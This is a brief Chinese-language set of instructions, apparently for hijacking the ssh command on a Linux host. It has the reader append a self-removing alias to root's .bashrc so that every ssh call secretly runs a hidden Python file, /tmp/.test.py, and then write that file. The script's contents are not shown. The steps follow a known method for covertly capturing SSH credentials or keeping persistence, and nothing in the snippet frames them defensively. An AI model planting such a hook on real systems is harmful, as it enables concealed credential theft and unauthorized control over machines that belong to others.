使用：

`vim /root/.bashrc`  最后一行： `alias ssh='unalias ssh > /dev/null 2>&1;python3 /tmp/.test.py'`

执行：`source /root/.bashrc`

执行 `vim /tmp/.test.py`，写入python文件
